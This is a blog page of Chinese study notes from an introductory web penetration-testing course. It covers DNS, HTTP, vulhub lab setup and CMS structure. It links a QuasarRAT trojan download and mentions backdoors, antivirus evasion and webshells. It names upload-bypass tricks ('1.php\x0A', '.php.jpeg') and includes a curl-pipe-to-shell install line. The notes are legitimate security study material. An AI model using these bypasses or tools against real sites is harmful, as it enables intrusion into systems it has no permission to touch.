<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="b站小迪2020, Hexo">
    <meta name="description" content="
12总目录	https://mp.weixin.qq.com/s/t3mW_1akFSzlHJEKVhSdaQ

day01-基础入门 概念名词12345678910111213141516171819202122232425262728">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>b站小迪2020 | Hexo</title>
    <link rel="icon" type="image/png" href="/favicon.png">
    


    <!-- bg-cover style     -->



<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
<link rel="stylesheet" type="text/css" href="/css/matery.css">
<link rel="stylesheet" type="text/css" href="/css/my.css">
<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">




    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
    <link rel="stylesheet" href="/css/post.css">




    
        <link rel="stylesheet" type="text/css" href="/css/reward.css">
    



    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 6.3.0"></head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Hexo</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
  <li>
    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Hexo</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">b站小迪2020</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                          <div class="article-tag">
                            <span class="chip bg-color">无标签</span>
                          </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/" class="post-category">
                                安全学习
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2023-07-05
                </div>
                

                

                

                

                
            </div>
        </div>
        <hr class="clearfix">

        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <hr>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">总目录</span><br><span class="line">	https://mp.weixin.qq.com/s/t3mW_1akFSzlHJEKVhSdaQ</span><br></pre></td></tr></table></figure>

<h3 id="day01-基础入门-概念名词"><a href="#day01-基础入门-概念名词" class="headerlink" title="day01-基础入门 概念名词"></a>day01-基础入门 概念名词</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">1.1	域名</span><br><span class="line">	二级域名 多级域名</span><br><span class="line">	baidu.com							顶级域名</span><br><span class="line">    news.baidu.com	www.baidu.com		二级域名</span><br><span class="line">    inurl:news.baidu.com搜索多级域名		share.news.baidu.com</span><br><span class="line">    域名发现对于安全测试的意义</span><br><span class="line">1.2	DNS	Domain Name System		域名和IP地址的相互转换</span><br><span class="line">	HOSTS与DNS的关系</span><br><span class="line">		C:\Windows\System32\drivers\etc\hosts,这里改ip地址可以重定向，域名劫持</span><br><span class="line">			此处改1.2.3.4	www.xiaodi8.com再ping会访问1.2.3.4</span><br><span class="line">	CDN CDN与DNS关系</span><br><span class="line">		百度搜超级ping，ping www.youku.com会发现不同位置解析的ip不同，CDN就是说访问一个远的ip地址会慢，在用户周围会提供缓存的节点（比如移动cdn，联通cdn），这样可以提升响应速度</span><br><span class="line">	常见DNS安全攻击</span><br><span class="line">		DNS劫持：放行审查范围以外的请求否则返回假的ip地址或什么都不做</span><br><span class="line">		缓存投毒	DNS 	DDOS攻击	域名劫持</span><br><span class="line">1.3	脚本语言</span><br><span class="line">	常用做网站</span><br><span class="line">		asp &quot;php&quot; aspx jsp &quot;javaweb&quot; pl py cgi action python的django等</span><br><span class="line">	不同脚本语言与安全漏洞的关系</span><br><span class="line">1.4	后门</span><br><span class="line">	什么是后门</span><br><span class="line">		1.绕过安全性控制而获取对程序或系统访问权的程序方法</span><br><span class="line">		2.开发阶段，程序员在软件内创建后门以便修改程序设计中的缺点</span><br><span class="line">	后门在安全测试中部分的实际意义</span><br><span class="line">		1.更方便的链接到主机</span><br><span class="line">		2.获取主机权限时，后门可以充当命令控制台的角色</span><br><span class="line">	玩法	免（查）杀</span><br><span class="line">1.5	WEB</span><br><span class="line">	组成架构</span><br><span class="line">		网站源码：分脚本类型，应用方向</span><br><span class="line">		操作系统</span><br><span class="line">		中间件	apache iis tomcat nginx</span><br><span class="line">		数据库 access mysql msssql oracle sybase postsql</span><br><span class="line">	为何以web层面为首</span><br><span class="line">		使用的比较广</span><br><span class="line">		漏洞相对较多</span><br><span class="line">		跳板深入到其他资源相对容易 提权</span><br><span class="line">1.6	WEB相关安全漏洞</span><br><span class="line">	WEB 源码类对应漏洞：SQL 注入，上传，XSS，代码执行，变量覆盖，逻辑漏洞，反序列化等</span><br><span class="line">    WEB 中间件对应漏洞：未授权访问，变量覆盖...</span><br><span class="line">    WEB 数据库对应漏洞：弱口令，权限提升...</span><br><span class="line">    WEB 系统层对应漏洞：提权，远程代码执行</span><br><span class="line">    其他第三方对应漏洞</span><br><span class="line">    APP 或 PC 应用结合类</span><br><span class="line">资源</span><br><span class="line">	http://www.xyaz.cn 								#逍遥安卓模拟器</span><br><span class="line">	http://www.downcc.com/soft/11196.html 			#wsexplorer网络抓包工具 v1.5 绿色中文版</span><br><span class="line">	https://github.com/quasar/QuasarRAT/releases 	#quasar exe木马</span><br><span class="line">	https://pan.baidu.com/s/13_i1ExwEaA59GfMt1Rp0Hg提取码: 0b7b	#apk的逆向获取信息 漏了个大洞.zip</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ping指令显示的ttl</span><br><span class="line">	云服务器上</span><br><span class="line">	ping localhost -c 1			#ttl=64 一般linux256是初值，windows是128，这个值可以改，windows在注册表[HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Tcpip\Parameters]	&quot;DefaultTTL&quot;=dword:000000ff</span><br><span class="line">	ping www.baidu.com -c 1		#ttl=53</span><br><span class="line">	说明途径64-53+1个路由器</span><br><span class="line">	linux traceroute</span><br><span class="line">	windows tracert</span><br><span class="line">演示案例</span><br><span class="line">    多级域名枚举查找（原理，方式）</span><br><span class="line">		1.百度搜索youku.com</span><br><span class="line">		2.用工具 前缀字典爆破		可以用burpsuite</span><br><span class="line">		3.第三方 域名注册商</span><br><span class="line">		4.查询A记录、MX记录、CNAME记录和NS记录</span><br><span class="line">    DNS解析修改后分析（本地或服务）</span><br><span class="line">		hosts文件添加1.2.3.4  www.xiaodi8.com</span><br><span class="line">    EXE后门功能及危害及类似WEB后门</span><br><span class="line">    APP类结合WEB协议，PC类结合WEB协议</span><br><span class="line">    	app逆向-》漏了个大洞-》apk文件</span><br><span class="line">    png TTL值</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1656771858190.png" alt="1656771858190"></p>
<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1656772025807.png" alt="1656772025807"></p>
<h3 id="day02-基础入门-数据包拓展"><a href="#day02-基础入门-数据包拓展" class="headerlink" title="day02-基础入门 数据包拓展"></a>day02-基础入门 数据包拓展</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">2.1	https与http</span><br><span class="line">	HTTPS协议需要到CA申请证书，一般免费证书很少，需要交费。</span><br><span class="line">	HTTP协议运行在TCP之上，所有传输的内容都是明文，HTTPS运行在SSL/TLS之上，SSL/TLS运行在TCP之上，所有传输的内容都经过加密的。</span><br><span class="line">	HTTPS可以有效的防止运营商劫持，解决了防劫持的一个大问题</span><br><span class="line">	HTTP和HTTPS使用的是完全不同的连接方式，用的端口也不一样，前者是80，后者是443。</span><br><span class="line">2.2 Request 请求数据包数据格式</span><br><span class="line">	请求行	由三个标记组成：请求方法、请求 URL 和 HTTP 版本，它们用空格分开</span><br><span class="line">		HTTP 规划定义了 8 种可能的请求方法：</span><br><span class="line">            GET：检索 URL 中标识资源的一个简单请求</span><br><span class="line">            HEAD：与 GET 方法相同，服务器只返回状态行和头标，并不返回请求文档</span><br><span class="line">            POST：服务器接受被写入客户端输出流中的数据的请求</span><br><span class="line">            PUT：服务器保存请求数据作为指定URL新内容的请求</span><br><span class="line">            DELETE：服务器删除 URL 中命令的资源的请求</span><br><span class="line">            OPTIONS：关于服务器支持的请求方法信息的请求</span><br><span class="line">            TRACE：web 服务器反馈 Http 请求和其头标的请求</span><br><span class="line">            CONNECT ：已文档化，但当前未实现的一个方法，预留做隧道处理</span><br><span class="line">	请求头	由关键字/值对组成，每行一对，关键字和值用冒号分享。请求头标通知服务器腾于客户端的功能和标识</span><br><span class="line">		HOST: 主机或域名地址</span><br><span class="line">        Accept：指浏览器或其他客户可以接爱的 MIME 文件格式。Servlet 可以根据它判断并返回适当的文件格式。</span><br><span class="line">        User-Agent：是客户浏览器名称</span><br><span class="line">        Host：对应网址URL中的Web名称和端口号。</span><br><span class="line">        Accept-Langeuage：指出浏览器可以接受的语言种类，如 en 或 en-us，指英语。</span><br><span class="line">        connection：用来告诉服务器是否可以维持固定的HTTP连接。http是无连接的，HTTP/1.1 使用 Keep-Alive为默认值，这样，当浏览器需要多个文件时(比如一个 HTML 文件和相关的图形文件)，不需要每次都建立连接</span><br><span class="line">        Cookie：浏览器用这个属性向服务器发送Cookie，Cookie是在浏览器中寄存的小型数据体，它可以记载</span><br><span class="line">        和服务器相关的用户信息，也可以用来实现会话功能。</span><br><span class="line">        Referer：表明产生请求的网页URL。如比从网页/icconcept/index.jsp中点击一个链接到网页/icwork/search，在向服务器发送的GET/icwork/search中的请求中，Referer是http://hostname:8080/icconcept/index.jsp。这个属性可以用来跟踪Web请求是从什么网站来的。</span><br><span class="line">        Content-Type：用来表名request的内容类型。可以用HttpServletRequest的getContentType()方法取得。</span><br><span class="line">        Accept-Charset：指出浏览器可以接受的字符编码。英文浏览器的默认值是 ISO-8859-1.</span><br><span class="line">        Accept-Encoding：指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件并加速文件传递速度。浏览器在接收到 Web 响应之后先解码，然后再检查文件格式。</span><br><span class="line">	空行</span><br><span class="line">		最后一个请求头标之后是空行，发送回车符和退行，通知服务器以下不再有头标。</span><br><span class="line">	请求数据</span><br><span class="line">		使用POST传送，最常使用的是Content-Type和Content-Length头标。</span><br><span class="line">2.3	Response 返回数据包数据格式</span><br><span class="line">	一个响应由四个部分组成；状态行、响应头标、空行、响应数据。</span><br><span class="line">    	1.状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔</span><br><span class="line">    	2.响应头标：包含服务器类型、日期、长度、内容类型等</span><br><span class="line">    	3.空行：响应头与响应体之间用空行隔开</span><br><span class="line">    	4.响应数据：浏览器会将实体内容中的数据取出来，生成相应的页面</span><br><span class="line">    HTTP响应码，参考https://blog.csdn.net/ChineseSoftware/article/details/123177081</span><br><span class="line">    	1xx：信息，请求收到，继续处理</span><br><span class="line">        2xx：成功，行为被成功地接受、理解和采纳</span><br><span class="line">        	200 存在文件</span><br><span class="line">        3xx：重定向，为了完成请求，必须进一步执行的动作</span><br><span class="line">        	3xx	均可能存在</span><br><span class="line">        4xx：客户端错误</span><br><span class="line">        	403 存在文件夹</span><br><span class="line">        	404 不存在文件及文件夹</span><br><span class="line">        5xx：服务器错</span><br><span class="line">        	500 均可能存在</span><br><span class="line">	资源</span><br><span class="line">		https://www.mozhe.cn/</span><br><span class="line">		https://www.mozhe.cn/bug/N2dmMnp1b1VYd2EzLzBNR3MvRVlIZz09bW96aGUmozhe</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip.chinaz.com站长工具显示的浏览器标识可以通过bp抓包改UA搞成XSS的样子</span><br><span class="line">有一个思路是使用手机和电脑分别去抓包比较请求包的不同</span><br></pre></td></tr></table></figure>

<h3 id="day03-基础入门-搭建安全扩展"><a href="#day03-基础入门-搭建安全扩展" class="headerlink" title="day03-基础入门 搭建安全扩展"></a>day03-基础入门 搭建安全扩展</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">	域名扫描只能扫描出来域名文件，而域名文件只是占服务器资源的一小部分；IP扫描可以直接扫描出来服务器的根目录，得到的信息更多；</span><br><span class="line">	iis服务器（win2003演示）</span><br><span class="line">		在配置中有一个设置后缀格式使用asp.dll解析的，可以上传别的不是.asp的文件去使用一巨话木马连接</span><br><span class="line">		身份验证有一个启用匿名访问会对访问ip进行限制</span><br><span class="line">		ip地址和域名限制可以限制指定用户登录</span><br><span class="line">3.1 网站搭建环境</span><br><span class="line">	ASP,PHP,ASPX,JSP,PY,JAVAWEB 等环境</span><br><span class="line">	源码中的敏感文件</span><br><span class="line">		后台路径，数据库配置文件，备份文件等</span><br><span class="line">3.2 基于中间件的简要识别</span><br><span class="line">	返回数据包 server</span><br><span class="line">3.3 后门注意事项</span><br><span class="line">	后门是否给予执行权限</span><br><span class="line">    后门是否给予操作目录或文件权限</span><br><span class="line">    后门是否给予其他用户权限 </span><br><span class="line">https://vulhub.org/#/environments/</span><br></pre></td></tr></table></figure>

<h4 id="安装vulhub"><a href="#安装vulhub" class="headerlink" title="安装vulhub"></a>安装vulhub</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">按照顺序做</span><br><span class="line">https://vulhub.org/#/docs/download-vulhub/</span><br><span class="line">先安装docker			#安装在云服务器失败了可能是docker安装版本的问题</span><br><span class="line">    curl -s https://get.docker.com/ | sh</span><br><span class="line">安装docker-compose，这一步有点问题，要使用pip3安装docker-compose，centos内置python2.7，所以要装python3，且要装pip3且要upgrade pip3版本</span><br><span class="line">	https://blog.csdn.net/qq_32742573/article/details/119849634</span><br><span class="line">	yum install python3-pip</span><br><span class="line">	pip3 install --upgrade pip</span><br><span class="line">	pip3 install docker-compose</span><br><span class="line">下载vulhub，这里先升级git</span><br><span class="line">	https://blog.csdn.net/bin9wei/article/details/121299033</span><br><span class="line">	git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">之后参照漏洞环境部分，此处git碰到点问题可能是代理的问题莫名其妙好了</span><br><span class="line"></span><br><span class="line">	参考https://vulhub.org/#/environments/httpd/CVE-2017-15715/</span><br><span class="line">	systemctl enable docker</span><br><span class="line">	首先cd目录</span><br><span class="line">		cd flask/ssti</span><br><span class="line">	编译</span><br><span class="line">		docker-compose up -d</span><br><span class="line">			（如果编译过，docker-compose build）</span><br><span class="line">	移除</span><br><span class="line">		docker-compose down</span><br><span class="line">	</span><br><span class="line">	e.g.1 CVE-2017-15715，这是个文件上传解析漏洞上传1.php\x0A可绕过一些服务器的安全策略</span><br><span class="line">	e.g.2 Apache HTTPD多后缀解析漏洞这个也是.php.jpeg当作php文件执行了</span><br><span class="line">		值得一提的是，这个靶场是搭建在80端口，和我本地phpstudy搭建的apache重叠了，解决方法是从小皮面板进去关掉apache</span><br><span class="line">		lsof -i:80</span><br><span class="line">		不使用面板,sh start开sh stop关/usr/local/phpstudy/soft/apache/httpd-2.4.46,如下图所示</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1665762508224.png" alt="1665762508224"></p>
<h3 id="day04-基础入门-WEB源码拓展"><a href="#day04-基础入门-WEB源码拓展" class="headerlink" title="day04-基础入门 WEB源码拓展"></a>day04-基础入门 WEB源码拓展</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">敏感目录结构：</span><br><span class="line">	数据库配置文件，后台目录，模版目录，数据库目录等</span><br><span class="line">web脚本类型：</span><br><span class="line">	ASP,PHP,ASPX,JSP,JAVAWEB 等脚本类型源码</span><br><span class="line">应用分类：</span><br><span class="line">	社交，论坛(XSS、逻辑漏洞)，门户(综合类漏洞)，第三方(根据功能)，博客(漏洞较少),门户(综合),电商(业务逻辑)等不同的代码机制对应漏洞</span><br><span class="line">开源，未开源问题，框架非框架问题，关于 CMS 识别问题及后续等</span><br><span class="line">关于源码获取的相关途径：</span><br><span class="line">	百度搜索，咸鱼淘宝，第三方源码站</span><br><span class="line">总结</span><br><span class="line">	关注应用分类及脚本类型估摸出可能存在的漏洞（其中框架类例外），在获取源码后可进行本地安全测试或代码审计，也可以分析其目录工作原理（数据库备份，bak 文件等），未获取到的源码采用各种方法想办法获取</span><br><span class="line">程序源码获取途径</span><br><span class="line">	大众型的，知名的网上直接搜（thinkphp，币圈）</span><br><span class="line">	小众型的，正规的有正规渠道，非法的有非法的渠道</span><br><span class="line">	获取之后可以代码审计，脚本类型（asp，php，aspx，jsp），cms（分大众型小众型）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">此处举例BEES_4.0_R_20160525的CMS源码</span><br><span class="line">	admin后台操作后台路径</span><br><span class="line">	article文章</span><br><span class="line">	data数据相关</span><br><span class="line">		config.php数据库配置信息</span><br><span class="line">	member会员的</span><br><span class="line">	template模板</span><br><span class="line">关于语言的漏洞	这是一个笔记文件https://websec.readthedocs.io/zh/latest/language/php/index.html</span><br><span class="line">CMS漏洞举例</span><br><span class="line">	http://xiaodi8.com/?id=182</span><br><span class="line">		emm这个小迪举例翻车</span><br><span class="line">	CMS识别网站</span><br><span class="line">		whatweb.bugscaner.com/look</span><br><span class="line">	此处举例了一个币圈的cms,可以通过网页加载的一个文件使用google去搜获取cms信息</span><br></pre></td></tr></table></figure>



<h3 id="day05-基础入门-系统及数据库"><a href="#day05-基础入门-系统及数据库" class="headerlink" title="day05-基础入门 系统及数据库"></a>day05-基础入门 系统及数据库</h3><p> <img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/640-1688030928583.png" alt="图片"> </p>
